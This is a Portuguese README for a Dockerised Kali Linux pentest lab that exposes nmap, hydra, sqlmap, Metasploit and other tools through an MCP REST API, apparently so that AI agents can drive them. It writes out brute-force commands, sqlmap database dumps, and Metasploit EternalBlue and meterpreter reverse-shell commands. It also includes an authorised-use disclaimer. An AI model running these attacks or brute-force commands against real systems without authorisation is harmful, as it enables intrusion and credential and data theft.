# Kali Linux MCP Pentest Environment

![Version](https://img.shields.io/badge/version-1.0.0-blue)
![License](https://img.shields.io/badge/license-MIT-green)
![Docker](https://img.shields.io/badge/docker-ready-blue)

Ambiente completo de testes de penetração baseado em Kali Linux com servidor MCP (Model Context Protocol) para automação e controle de ferramentas de segurança.

## 🎯 Características

- **Kali Linux Rolling** - Última versão com todas as ferramentas atualizadas
- **MCP Server** - API RESTful para controle remoto das ferramentas
- **Ferramentas Principais**:
  - 🔍 Scanning: nmap, masscan, netdiscover
  - 🔨 Brute Force: hydra, medusa, john
  - 🌐 Web Testing: sqlmap, wpscan, nikto, dirb, gobuster
  - 💣 Exploitation: metasploit-framework
  - 📡 Wireless: aircrack-ng, reaver
  - 📊 Análise: wireshark, tcpdump
- **Scripts Automatizados** - Workflows completos de reconnaissance e brute force
- **Persistência de Dados** - Reports, wordlists e configurações persistentes
- **Docker Ready** - Deploy rápido e isolado

## 🧰 Ferramentas Suportadas

As categorias abaixo listam as principais ferramentas instaladas e suportadas pelo ambiente.

- Scanning e Descoberta
  - nmap, masscan, netdiscover, arp-scan, dnsenum, fierce, sslscan, ike-scan, unicornscan, lbd, amass, subfinder
- Recon/OSINT e Fingerprinting
  - theHarvester, maltego, dnsrecon, whatweb, wafw00f, dmitry, spiderfoot, smtp-user-enum, snmp-check, assetfinder, gau, waybackurls, massdns, paramspider, arjun, sublist3r, cloudbrute
- Web Testing e DAST
  - sqlmap, wpscan, nikto, dirb, gobuster, wfuzz, dirbuster, joomscan, cmsmap, xsstrike, beef-xss, skipfish, arachni, davtest, droopescan, httpx, nuclei, ffuf, feroxbuster, dirsearch, dalfox, commix
- Password/Brute Force e Wordlists
  - hydra, medusa, john, hashcat, patator, ncrack, cewl, crunch, ophcrack, brutespray
- Exploitation e Pós-Exploração
  - metasploit-framework, armitage, routersploit, set (SET Toolkit), mimikatz, powershell-empire, weevely, linux-exploit-suggester, windows-exploit-suggester
- Wireless e Radio
  - aircrack-ng, reaver, wifite, bully, kismet, pixiewps, fern-wifi-cracker, mdk4, airgeddon, wifi-pumpkin3
- Sniffing/Spoofing e L2/L3
  - bettercap, ettercap-text-only, driftnet, mitmf, yersinia, responder
- Active Directory, SMB e Protocolos
  - crackmapexec, impacket-scripts, bloodhound, ldapdomaindump, enum4linux, smbclient, nbtscan, snmp
- Forense e Engenharia Reversa
  - autopsy, volatility, binwalk, foremost, ghidra, radare2, apktool, dex2jar, exiftool
- Proxies e Ferramentas de Suporte
  - zaproxy (OWASP ZAP), burpsuite, zenmap, tor, torsocks, awscli

Observação: além das ferramentas acima, o ambiente inclui bibliotecas e utilitários de suporte (Python, Node.js, Go, build-essential, etc.) para permitir extensão e automação.

## 📋 Pré-requisitos

- Docker >= 20.10
- Docker Compose >= 2.0
- Mínimo 8GB RAM (recomendado 16GB)
- 20GB espaço em disco
- Linux/macOS (Windows com WSL2)

## 🚀 Instalação

### 1. Clone ou crie o projeto

```bash
mkdir kali-mcp && cd kali-mcp
# Copie todos os arquivos fornecidos para esta pasta
```

### 2. Estrutura de diretórios

```
kali-mcp/
├── Dockerfile
├── docker-compose.yml
├── README.md
├── mcp-server/
│   ├── server.js
│   └── package.json
└── scripts/
    ├── full_recon.sh
    └── auto_bruteforce.sh
```

### 3. Build da imagem

```bash
docker-compose build
```

### 4. Iniciar o container

```bash
docker-compose up -d
```

### 5. Acessar o container

```bash
docker exec -it cleo-kali-mcp /bin/bash
```

## 🔧 Uso

### MCP Server API

O servidor MCP estará disponível em `http://localhost:3000`

#### Endpoints Disponíveis

**Informações do Servidor**

```bash
GET http://localhost:3000/
GET http://localhost:3000/health
GET http://localhost:3000/api/tools/list
```

**Execução Genérica e Orquestração**

```bash
# Executar qualquer ferramenta suportada pelo template runner
POST http://localhost:3000/api/tools/run
Content-Type: application/json

{
  "tool": "whatweb",
  "target": "example.com",
  "options": ""
}

# Dry-run (avaliação de risco e comando gerado, sem execução)
POST http://localhost:3000/api/tools/dry-run
Content-Type: application/json

{
  "tool": "wafw00f",
  "target": "example.com",
  "options": ""
}

# Pipeline (múltiplos passos encadeados, com suporte a dryRun por etapa)
POST http://localhost:3000/api/tools/pipeline
Content-Type: application/json

{
  "steps": [
    { "tool": "assetfinder", "target": "example.com", "options": "--subs-only", "dryRun": false },
    { "tool": "httpx", "target": "https://example.com", "options": "", "dryRun": true }
  ]
}
```

**Scanning com Nmap**

```bash
POST http://localhost:3000/api/scan/nmap
Content-Type: application/json

{
  "target": "192.168.1.0/24",
  "options": "-sV -sC -O",
  "output": "normal"
}
```

**Scanning com Masscan**

```bash
POST http://localhost:3000/api/scan/masscan
Content-Type: application/json

{
  "target": "192.168.1.100",
  "ports": "1-65535",
  "rate": "1000"
}
```

**Brute Force com Hydra**

```bash
POST http://localhost:3000/api/bruteforce/hydra
Content-Type: application/json

{
  "target": "192.168.1.100",
  "service": "ssh",
  "username": "root",
  "passlist": "/root/wordlists/rockyou.txt",
  "port": 22
}
```

**SQL Injection com SQLMap**

```bash
POST http://localhost:3000/api/web/sqlmap
Content-Type: application/json

{
  "url": "http://example.com/page.php?id=1",
  "options": "--batch --risk=1 --level=1"
}
```

**WordPress Scan**

```bash
POST http://localhost:3000/api/web/wpscan
Content-Type: application/json

{
  "url": "http://wordpress-site.com",
  "options": "--enumerate p,t,u"
}
```

**Nikto Web Scanner**

```bash
POST http://localhost:3000/api/web/nikto
Content-Type: application/json

{
  "host": "example.com",
  "port": 80,
  "ssl": false
}
```

**Directory Brute Force (Dirb)**

```bash
POST http://localhost:3000/api/web/dirb
Content-Type: application/json

{
  "url": "http://example.com",
  "wordlist": "/usr/share/wordlists/dirb/common.txt"
}
```

**Directory Brute Force (Gobuster)**

```bash
POST http://localhost:3000/api/web/gobuster
Content-Type: application/json

{
  "url": "http://example.com",
  "wordlist": "/usr/share/wordlists/dirb/common.txt",
  "mode": "dir",
  "extensions": "php,html,txt"
}
```

**Metasploit Console**

```bash
POST http://localhost:3000/api/exploit/msfconsole
Content-Type: application/json

{
  "commands": [
    "use exploit/multi/handler",
    "set payload windows/meterpreter/reverse_tcp",
    "set LHOST 192.168.1.100",
    "set LPORT 4444",
    "exploit"
  ]
}
```

**Skills e Documentação de Ferramentas**

```bash
# Lista de skills disponíveis
GET http://localhost:3000/api/skills/list

# Conteúdo da skill de uma ferramenta específica
GET http://localhost:3000/api/skills/<tool>
```

**Listar Reports**

```bash
GET http://localhost:3000/api/reports
GET http://localhost:3000/api/reports/:filename
```

**Sumário e Artefatos**

```bash
# Resumo de um report (primeiros 4k de conteúdo)
GET http://localhost:3000/api/reports/summary/:filename

# Index de artefatos (filtrável por tool/target/type)
GET http://localhost:3000/api/artifacts
```

### Scripts Automatizados

#### Full Network Reconnaissance

Script completo de reconhecimento de rede:

```bash
# Dentro do container
/root/scripts/full_recon.sh 192.168.1.0/24

# Ou especificando diretório de output
/root/scripts/full_recon.sh 192.168.1.0/24 /root/reports/empresa_x
```

**O que faz:**

1. Host Discovery (nmap ping scan)
2. Port Scanning (masscan rápido)
3. Service Detection (nmap -sV -sC)
4. Vulnerability Scanning (nmap --script vuln)
5. Web Enumeration (nikto)
6. Gera relatório consolidado

#### Automated Brute Force

```bash
# SSH Brute Force
/root/scripts/auto_bruteforce.sh 192.168.1.100 ssh -u root

# FTP com wordlists customizadas
/root/scripts/auto_bruteforce.sh 192.168.1.50 ftp -U users.txt -P passwords.txt

# MySQL em porta customizada
/root/scripts/auto_bruteforce.sh db.example.com mysql -u admin -s 3307 -t 32

# HTTP POST Form
/root/scripts/auto_bruteforce.sh example.com http-post-form \
  -U users.txt -P passwords.txt
```

**Opções disponíveis:**

- `-u` - Username único
- `-U` - Arquivo com lista de usernames
- `-p` - Password único
- `-P` - Arquivo com lista de passwords
- `-s` - Porta customizada
- `-t` - Número de threads
- `-o` - Arquivo de output

### Uso Manual das Ferramentas

#### Nmap

```bash
# Scan básico
nmap -sV -sC 192.168.1.100

# Scan completo
nmap -sV -sC -O -A -p- 192.168.1.100

# Scan de vulnerabilidades
nmap --script vuln 192.168.1.100

# Scan stealth
nmap -sS -T4 192.168.1.100
```

#### Masscan

```bash
# Scan rápido de todas as portas
masscan 192.168.1.0/24 -p1-65535 --rate=1000

# Scan de portas específicas
masscan 192.168.1.0/24 -p80,443,8080 --rate=10000
```

#### Hydra

```bash
# SSH
hydra -l root -P /root/wordlists/rockyou.txt ssh://192.168.1.100

# FTP
hydra -L users.txt -P passwords.txt ftp://192.168.1.100

# HTTP POST
hydra -l admin -P passwords.txt 192.168.1.100 http-post-form \
  "/login:username=^USER^&password=^PASS^:F=incorrect"

# RDP
hydra -l administrator -P passwords.txt rdp://192.168.1.100
```

#### SQLMap

```bash
# Teste básico
sqlmap -u "http://example.com/page.php?id=1" --batch

# Dump database
sqlmap -u "http://example.com/page.php?id=1" --dbs --dump

# POST request
sqlmap -u "http://example.com/login" --data="user=admin&pass=test"

# Com cookie de sessão
sqlmap -u "http://example.com/page.php?id=1" \
  --cookie="PHPSESSID=abc123" --batch
```

#### Metasploit

```bash
# Iniciar console
msfconsole

# Buscar exploits
search type:exploit platform:windows

# Usar exploit
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.100
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.50
exploit

# Database
msfdb init
db_status
```

## 📂 Diretórios Persistentes

O docker-compose configura volumes para persistir dados importantes:

- `./reports` → `/root/reports` - Todos os relatórios gerados
- `./scripts` → `/root/scripts` - Scripts personalizados
- `./targets` → `/root/targets` - Informações sobre alvos
- `./wordlists` → `/root/wordlists` - Wordlists customizadas
- `./nmap-results` → `/root/nmap-results` - Resultados do nmap
- `./config` → `/root/.config` - Configurações

## 📚 Wordlists

- Pacotes instalados: `wordlists` e `seclists`
- Caminhos padrão:
  - Sistema: `/usr/share/wordlists`
  - Acesso rápido: `/root/wordlists` (cópia descompactada quando aplicável)
- Permissões de leitura garantidas para compatibilidade com ferramentas (dirb, gobuster, hydra, etc.).

## 🔒 Segurança e Ética

⚠️ **AVISO IMPORTANTE**:

1. **USO ÉTICO**: Use apenas em ambientes autorizados
2. **PERMISSÃO**: Sempre obtenha permissão por escrito
3. **RESPONSABILIDADE**: O uso inadequado é ilegal
4. **ISOLAMENTO**: Execute em redes isoladas/VMs
5. **LOGS**: Mantenha logs de todas as atividades

**Este ambiente é apenas para:**

- Pentest autorizado
- Segurança ofensiva em ambiente próprio
- Educação e treinamento
- Bug bounty programs autorizados
- Red team exercises autorizados

## 🛠️ Troubleshooting

### Container não inicia

```bash
# Verificar logs
docker-compose logs -f

# Rebuild sem cache
docker-compose build --no-cache
```

### MCP Server não responde

```bash
# Verificar se está rodando
docker exec cleo-kali-mcp ps aux | grep node

# Reiniciar o server
docker exec cleo-kali-mcp pkill node
docker exec cleo-kali-mcp /root/start.sh
```

### Wordlists não encontradas

```bash
# Descompactar rockyou
docker exec cleo-kali-mcp gunzip /root/wordlists/rockyou.txt.gz

# Baixar SecLists
docker exec cleo-kali-mcp git clone \
  https://github.com/danielmiessler/SecLists /root/wordlists/seclists
```

### Permissões negadas

```bash
# Entrar como root
docker exec -it -u root cleo-kali-mcp /bin/bash
```

## 📊 Monitoramento

### Ver logs do MCP Server

```bash
docker logs -f cleo-kali-mcp
```

### Verificar recursos

```bash
docker stats cleo-kali-mcp
```

## 🔄 Atualizações

```bash
# Parar container
docker-compose down

# Atualizar imagem Kali
docker pull kalilinux/kali-rolling:latest

# Rebuild
docker-compose build --no-cache

# Iniciar novamente
docker-compose up -d
```

## 📝 Exemplos de Uso Completo

### Exemplo 1: Pentest em rede corporativa

```bash
# 1. Reconhecimento completo
/root/scripts/full_recon.sh 10.0.0.0/24 /root/reports/empresa_abc

# 2. Análise dos resultados
cat /root/reports/empresa_abc/SUMMARY_REPORT.txt

# 3. Brute force em serviços encontrados
/root/scripts/auto_bruteforce.sh 10.0.0.50 ssh -u admin
/root/scripts/auto_bruteforce.sh 10.0.0.51 ftp -U users.txt

# 4. Teste em aplicações web
curl -X POST http://localhost:3000/api/web/nikto \
  -H "Content-Type: application/json" \
  -d '{"host":"10.0.0.100","port":80}'
```

### Exemplo 2: Teste de aplicação web

```bash
# 1. Scan de diretórios
curl -X POST http://localhost:3000/api/web/gobuster \
  -H "Content-Type: application/json" \
  -d '{"url":"http://webapp.com","extensions":"php,html,txt"}'

# 2. Nikto scan
curl -X POST http://localhost:3000/api/web/nikto \
  -H "Content-Type: application/json" \
  -d '{"host":"webapp.com","port":443,"ssl":true}'

# 3. SQLMap
curl -X POST http://localhost:3000/api/web/sqlmap \
  -H "Content-Type: application/json" \
  -d '{"url":"http://webapp.com/page?id=1","options":"--batch"}'
```

## 🤝 Contribuindo

Contribuições são bem-vindas! Sinta-se livre para:

1. Reportar bugs
2. Sugerir novas features
3. Adicionar novos scripts
4. Melhorar documentação

## 📄 Licença

MIT License - Veja LICENSE para detalhes

## 👤 Autor

**Thierry Braga**

- LinkedIn: [linkedin.com/in/thierry-braga](https://linkedin.com/in/thierry-braga)

## ⚖️ Disclaimer

Esta ferramenta é fornecida apenas para fins educacionais e testes de segurança autorizados. O autor não se responsabiliza por uso inadequado ou ilegal desta ferramenta. Sempre obtenha permissão por escrito antes de realizar testes de penetração.

---

**Happy Hacking! 🎯**
